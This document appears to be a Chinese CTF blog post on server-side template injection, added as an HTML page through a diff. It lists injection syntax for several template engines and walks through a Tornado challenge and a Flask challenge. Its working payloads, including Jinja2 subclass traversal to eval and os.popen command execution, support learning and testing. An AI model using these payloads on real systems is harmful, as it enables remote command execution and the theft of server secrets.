@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -ssti," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言啊哈哈哈哈，ssti，不玩阴的，直接来吧。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssti模板注入">
+<meta property="og:url" content="http://example.com/2022/01/20/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言啊哈哈哈哈，ssti，不玩阴的，直接来吧。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/01/20/OVQMSEqZom9G3HF.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/20/DBi3zTVSu7ljHU9.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/20/wprDqvdEgm5PIxT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/20/d6wurNHLgyS7OlM.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/20/HDN8jKmUWaBfSY2.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/20/fMHiUSgDbmtyToX.png">
+<meta property="og:image" content="https://s2.loli.net/2022/01/20/BkxFcyTq7w5IMAp.png">
+<meta property="article:published_time" content="2022-01-20T04:41:44.000Z">
+<meta property="article:modified_time" content="2022-01-20T10:58:36.345Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -ssti">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/01/20/OVQMSEqZom9G3HF.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/01/20/ssti模板注入/"/>
+
+
+
+
+
+  <title>ssti模板注入 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/20/ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ssti模板注入</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-01-20T12:41:44+08:00">
+                2022-01-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>啊哈哈哈哈，ssti，不玩阴的，直接来吧。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="什么是模板"><a href="#什么是模板" class="headerlink" title="什么是模板"></a>什么是模板</h1><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的<br>语言表达式，以呈现动态内容。</p>
+<h1 id="什么是ssti（模板注入）"><a href="#什么是ssti（模板注入）" class="headerlink" title="什么是ssti（模板注入）"></a>什么是ssti（模板注入）</h1><p>当前使用的一些框架已经形成了非常成熟的MVC的模式，用户的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。<br>如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句。<br>凡是存在使用模板的地方都有可能存在ssti。</p>
+<h1 id="常见模板引擎汇总及tag"><a href="#常见模板引擎汇总及tag" class="headerlink" title="常见模板引擎汇总及tag"></a>常见模板引擎汇总及tag</h1><h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><ul>
+<li>Smarty：<code>&#123;php&#125;payload;&#123;/php&#125;</code>、<code>&#123;payload&#125;</code>、<code>&#123;if payload&#125;&#123;/if&#125;</code></li>
+<li>Twig：<code>&#123;&#123;payload&#125;&#125;</code></li>
+<li>Blade:详见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sgm4231/p/10283661.html">Blade模板引擎</a></li>
+</ul>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><ul>
+<li>FreeMarker：<code>$&#123;payload&#125;</code>、<code>&lt;#payload&gt;</code></li>
+<li>velocity:<code>#set($x=payload)$&#123;x&#125;</code></li>
+</ul>
+<h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><ul>
+<li>Flask/Jinja2:<code>&#123;&#123;payload&#125;&#125;</code></li>
+<li>Tornado:<code>&#123;&#123;payload&#125;&#125;</code>、<code>&#123;% import os %&#125;&#123;&#123; os.popen("whoami").read() &#125;&#125;</code></li>
+<li>Django:<code>&#123;&#123;payload&#125;&#125;</code>、<code>&#123;%payload%&#125;</code></li>
+</ul>
+<h1 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h1><p>我们进行ssti，目的一般都是为了创建对象、文件读写、远程文件包含、信息泄漏、提权等等。为了达成目的，我们必须找到适当的注入点进行攻击。<br>首先寻找模板本身支持的语法、内置的变量、属性、函数等等，接着是框架的全局变量、函数、属性等，再然后我们考虑语言本身的特性，最后以上都不行的情况下再考虑应用本身存在的变量。</p>
+<h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>这题的难点不在ssti上。首先进入题目三个文件，第一个告诉我们flag的文件名称，第二个提示我们render，第三个给我们一串加密逻辑:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+
+<p>我们观察url不难发现这个加密逻辑应该是filehash的逻辑，而我们只要将/fllllllllllllag对应的filehash算出来就可以了。但是这里有一个cookie_secret，结合提示render，render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用，我们猜测这里有一个ssti。<br>随意更改url进入error界面，我们发现url中有msg参数，进行模板测试：<br><img src="https://s2.loli.net/2022/01/20/OVQMSEqZom9G3HF.png"></p>
+<p>存在ssti，我们将msg改为获取cookie_secret：<br><img src="https://s2.loli.net/2022/01/20/DBi3zTVSu7ljHU9.png"></p>
+<p>最后编写脚本获取filehash：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename=&#x27;/fllllllllllllag&#x27;</span><br><span class="line">cookie_secret=&quot;6cd6901e-7485-435e-a8f7-aef19adf1227&quot;</span><br><span class="line">hash.update(filename.encode(&#x27;utf-8&#x27;))</span><br><span class="line">s1=hash.hexdigest()</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.update((cookie_secret+s1).encode(&#x27;utf-8&#x27;))</span><br><span class="line">print(hash.hexdigest())</span><br><span class="line"></span><br><span class="line">//582be1f6041bc39f2fdbed73bf1196fe</span><br></pre></td></tr></table></figure>
+<p>最后构建url获取flag：<br><img src="https://s2.loli.net/2022/01/20/wprDqvdEgm5PIxT.png"></p>
+<h1 id="Flask-SSTI"><a href="#Flask-SSTI" class="headerlink" title="[Flask]SSTI"></a>[Flask]SSTI</h1><p>通过查询源码发现存在ssti：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;&#123;&#123;title&#125;&#125;&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">      &lt;h1&gt;Hello, &#123;&#123;name&#125;&#125; !&lt;/h1&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>GET一个name参数测试，发现确实存在ssti：<br><img src="https://s2.loli.net/2022/01/20/d6wurNHLgyS7OlM.png"></p>
+<p>根据题目判断这提示flask ssti，那么先获取子类名：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__bases__[0].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/01/20/HDN8jKmUWaBfSY2.png"></p>
+<p>接着查看源码获取子类，我们需要找的大概是以下三类：<br>一是file模块中的read功能，用来读取各种文件，敏感信息等。<br>二是warnings.catch_warnings(需自己导入os模块)、socket._socketobject(需自己导入os模块)、site._Printer、site.Quitter等模块的内置os，通过os模块我们可以做到system执行命令（system执行成功返回0，不会在页面显示。）、popen管道读取文件、listdir列目录等操作。<br>三是get_flashed_messages() 获取闪现信息</p>
+<p>写脚本来获取子类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def find():</span><br><span class="line">    list = &quot;&quot;</span><br><span class="line">    list = list.replace(&#x27;\&#x27;&#x27;,&#x27;&#x27;)</span><br><span class="line">    list = list.replace(&#x27;&lt;&#x27;,&#x27;&#x27;)</span><br><span class="line">    list = list.replace(&#x27;&gt;&#x27;,&#x27;&#x27;)</span><br><span class="line">    list = list.replace(&#x27;class &#x27;,&#x27;&#x27;)</span><br><span class="line">    list = list.replace(&#x27;enum &#x27;,&#x27;&#x27;)</span><br><span class="line">    list = list.replace(&#x27;type &#x27;,&#x27;&#x27;)</span><br><span class="line">    list = list.replace(&#x27; &#x27;,&#x27;&#x27;)</span><br><span class="line">    list = list.split(&#x27;,&#x27;)</span><br><span class="line">    print(list)</span><br><span class="line">    className = &#x27;warnings.catch_warnings&#x27; #需要查找的模块名称</span><br><span class="line">    num = list.index(className)</span><br><span class="line">    print(num) #返回索引</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    find()</span><br></pre></td></tr></table></figure>
+<p>找到位置为166，接着查询全局变量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;[].__class__.__bases__[0].__subclasses__()[166].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/01/20/fMHiUSgDbmtyToX.png"></p>
+<p>发现<code>OSError</code>，说明可以自己导入os模块，本来以为是cat /flag，查了wp才发现是在环境变量中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__[0].__subclasses__()[166].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/01/20/BkxFcyTq7w5IMAp.png"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/web-ssti/" rel="tag"># -web -ssti</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/01/18/%E3%80%90N1BOOK%E7%AC%AC%E4%B8%80%E7%AB%A0%E3%80%91web%E5%9F%BA%E7%A1%80%E7%BB%83%E4%B9%A0/" rel="next" title="【N1BOOK第一章】web基础练习">
+                <i class="fa fa-chevron-left"></i> 【N1BOOK第一章】web基础练习
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">19</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF"><span class="nav-number"></span> <span class="nav-text">什么是模板</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFssti%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%EF%BC%89"><span class="nav-number"></span> <span class="nav-text">什么是ssti（模板注入）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E6%B1%87%E6%80%BB%E5%8F%8Atag"><span class="nav-number"></span> <span class="nav-text">常见模板引擎汇总及tag</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#php"><span class="nav-number">1.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java"><span class="nav-number">2.</span> <span class="nav-text">Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python"><span class="nav-number">3.</span> <span class="nav-text">Python</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="nav-number"></span> <span class="nav-text">攻击思路</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="nav-number"></span> <span class="nav-text">[护网杯 2018]easy_tornado</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Flask-SSTI"><span class="nav-number"></span> <span class="nav-text">[Flask]SSTI</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
